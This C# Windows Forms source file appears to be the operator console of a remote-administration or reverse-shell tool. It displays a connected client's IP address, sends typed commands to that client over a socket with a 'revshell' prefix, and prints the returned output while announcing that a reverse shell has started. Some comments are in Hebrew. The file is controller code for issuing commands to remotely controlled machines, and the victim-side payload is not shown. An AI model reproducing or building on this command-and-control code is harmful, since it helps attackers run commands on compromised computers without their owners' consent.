using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Threading;

namespace WindowsFormsApp23
{
    public partial class Form3 : Form
    {


        public string ip3 { get; set; }
        public Socket clientToSend { get; set; }
        public string newLine { get; set; }
        public string publicIP { get; set; }
        public Socket client { get; set; }




        public Form3()
        {
            InitializeComponent();
            
            this.StartPosition = FormStartPosition.CenterScreen;
            
            backgroundWorker1.RunWorkerAsync();

            
            //startupThread.Start(); //מפעיל את הטריד
            

        }

        void Main()
        {
            try
            {
                clientt.Invoke((MethodInvoker)delegate
                {
                    clientt.Text = ip3;
                    respone.Text += "Reverse shell has been started on " + ip3;
                });

                int i = 1;
                try
                {
                    while (i == 1)
                    {
                        try
                        {
                            int size = 0;
                            byte[] msg = new byte[1024];


                            size = client.Receive(msg);

                            respone.Invoke((MethodInvoker)delegate
                            {
                                respone.Text += ip3 + " >> " + System.Text.Encoding.ASCII.GetString(msg, 0, size) + newLine;
                            });



                        }
                        catch { this.Close(); }

                    }
                }
                catch { this.BeginInvoke((MethodInvoker)(() => this.Close())); }
            }catch { this.Close(); }//////////////////////////////
        }

        private void Form3_Load(object sender, EventArgs e)
        {
            try
            {
                string msgbox = (" ");
                byte[] Message = System.Text.Encoding.ASCII.GetBytes(msgbox);

                clientToSend.Send(Message);
            }
            catch
            {
                this.Close();
                MessageBox.Show("no connection. please remove this client from list.");

            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            byte[] sendCommand = System.Text.Encoding.ASCII.GetBytes("revshell " + command.Text + "1");

            


            clientToSend.Send(sendCommand);

            
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                int k = 1;
                while (k == 1)
                {
                    try
                    {
                        Thread startupThread = new Thread(new ThreadStart((Main)));//יוצר טריד
                        startupThread.Start();
                        k = 0;
                    }
                    catch { }
                }
            }catch { this.Close(); }


        }


        private void button3_Click(object sender, EventArgs e)
        {
            respone.Text = "";
        }

        private void respone_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
